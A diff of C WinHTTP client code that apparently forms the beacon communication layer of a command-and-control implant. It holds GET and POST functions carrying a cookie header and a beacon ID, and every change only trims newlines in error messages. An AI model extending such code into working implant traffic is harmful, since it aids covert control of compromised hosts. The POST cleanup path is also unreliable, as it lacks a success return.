@@ -108,7 +108,7 @@ unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
             WINHTTP_NO_PROXY_BYPASS, 0);
 
         if (!hSession) {
-            fprintf(stderr, "WinHttpOpen Failed (attempt %d): %lu\n\n", attempt, GetLastError());
+            fprintf(stderr, "WinHttpOpen Failed (attempt %d): %lu\n", attempt, GetLastError());
             Sleep(RETRY_DELAY_MS);
             continue;
         }
@@ -116,7 +116,7 @@ unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
         // 连接服务器
         HINTERNET hConnect = WinHttpConnect(hSession, server, port, 0);
         if (!hConnect) {
-            fprintf(stderr, "WinHttpConnect Failed (attempt %d): %lu\n\n", attempt, GetLastError());
+            fprintf(stderr, "WinHttpConnect Failed (attempt %d): %lu\n", attempt, GetLastError());
             WinHttpCloseHandle(hSession);
             Sleep(RETRY_DELAY_MS);
             continue;
@@ -127,7 +127,7 @@ unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
             WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 
         if (!hRequest) {
-            fprintf(stderr, "WinHttpOpenRequest Failed (attempt %d): %lu\n\n", attempt, GetLastError());
+            fprintf(stderr, "WinHttpOpenRequest Failed (attempt %d): %lu\n", attempt, GetLastError());
             WinHttpCloseHandle(hConnect);
             WinHttpCloseHandle(hSession);
             Sleep(RETRY_DELAY_MS);
@@ -142,7 +142,7 @@ unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
         // 发送请求
         if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
             WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
-            fprintf(stderr, "WinHttpSendRequest Failed (attempt %d): %lu\n\n", attempt, GetLastError());
+            fprintf(stderr, "WinHttpSendRequest Failed (attempt %d): %lu\n", attempt, GetLastError());
             WinHttpCloseHandle(hRequest);
             WinHttpCloseHandle(hConnect);
             WinHttpCloseHandle(hSession);
@@ -152,7 +152,7 @@ unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
 
         // 接受响应
         if (!WinHttpReceiveResponse(hRequest, NULL)) {
-            fprintf(stderr, "WinHttpReceiveResponse Failed (attempt %d): %lu\n\n", attempt, GetLastError());
+            fprintf(stderr, "WinHttpReceiveResponse Failed (attempt %d): %lu\n", attempt, GetLastError());
             WinHttpCloseHandle(hRequest);
             WinHttpCloseHandle(hConnect);
             WinHttpCloseHandle(hSession);
@@ -167,7 +167,7 @@ unsigned char* GET(wchar_t* cookie_header, size_t* responseSize) {
 
         do {
             if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
-                fprintf(stderr, "WinHttpReadData Failed: %lu\n\n", GetLastError());
+                fprintf(stderr, "WinHttpReadData Failed: %lu\n", GetLastError());
                 free(responseData);
                 responseData = NULL;
                 break;
@@ -297,16 +297,16 @@ BOOL POST(unsigned char* dataString, size_t dataSize, wchar_t* BeaconIdWideHeade
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) {
-        fprintf(stderr, "WinHttpOpen failed with error: %lu\n\n", GetLastError());
+        fprintf(stderr, "WinHttpOpen failed with error: %lu\n", GetLastError());
         return FALSE;
     }
 
     // 连接到服务器
     HINTERNET hConnect = WinHttpConnect(hSession, server, port, 0);
     if (!hConnect) {
-        fprintf(stderr, "WinHttpConnect failed with error: %lu\n\n", GetLastError());
+        fprintf(stderr, "WinHttpConnect failed with error: %lu\n", GetLastError());
         if (!WinHttpCloseHandle(hSession)) {
-            fprintf(stderr, "WinHttpCloseHandle failed with error for hSession: %lu\n\n", GetLastError());
+            fprintf(stderr, "WinHttpCloseHandle failed with error for hSession: %lu\n", GetLastError());
             return FALSE;
         }
         return FALSE;
@@ -321,13 +321,13 @@ BOOL POST(unsigned char* dataString, size_t dataSize, wchar_t* BeaconIdWideHeade
         WINHTTP_DEFAULT_ACCEPT_TYPES,
         0);
     if (!hRequest) {
-        fprintf(stderr, "WinHttpOpenRequest failed with error: %lu\n\n", GetLastError());
+        fprintf(stderr, "WinHttpOpenRequest failed with error: %lu\n", GetLastError());
         if (!WinHttpCloseHandle(hConnect)) {
-            fprintf(stderr, "WinHttpCloseHandle failed with error for hConnect: %lu\n\n", GetLastError());
+            fprintf(stderr, "WinHttpCloseHandle failed with error for hConnect: %lu\n", GetLastError());
             return FALSE;
         }
         if (!WinHttpCloseHandle(hSession)) {
-            fprintf(stderr, "WinHttpCloseHandle failed with error for hSession: %lu\n\n", GetLastError());
+            fprintf(stderr, "WinHttpCloseHandle failed with error for hSession: %lu\n", GetLastError());
             return FALSE;
         }
         return FALSE;
@@ -353,22 +353,22 @@ BOOL POST(unsigned char* dataString, size_t dataSize, wchar_t* BeaconIdWideHeade
         (LPVOID)dataString, dataSize,     // 请求体数据和长度
         dataSize,                         // 总数据长度
         0)) {
-        fprintf(stderr, "WinHttpSendRequest failed with error: %lu\n\n", GetLastError());
+        fprintf(stderr, "WinHttpSendRequest failed with error: %lu\n", GetLastError());
         goto cleanup;
         return FALSE;
     }
 
 cleanup:
     if (!WinHttpCloseHandle(hRequest)) {
-        fprintf(stderr, "WinHttpCloseHandle failed with error for hRequest: %lu\n\n", GetLastError());
+        fprintf(stderr, "WinHttpCloseHandle failed with error for hRequest: %lu\n", GetLastError());
         return FALSE;
     }
     if (!WinHttpCloseHandle(hConnect)) {
-        fprintf(stderr, "WinHttpCloseHandle failed with error for hConnect: %lu\n\n", GetLastError());
+        fprintf(stderr, "WinHttpCloseHandle failed with error for hConnect: %lu\n", GetLastError());
         return FALSE;
     }
     if (!WinHttpCloseHandle(hSession)) {
-        fprintf(stderr, "WinHttpCloseHandle failed with error for hSession: %lu\n\n", GetLastError());
+        fprintf(stderr, "WinHttpCloseHandle failed with error for hSession: %lu\n", GetLastError());
         return FALSE;
     }
 }
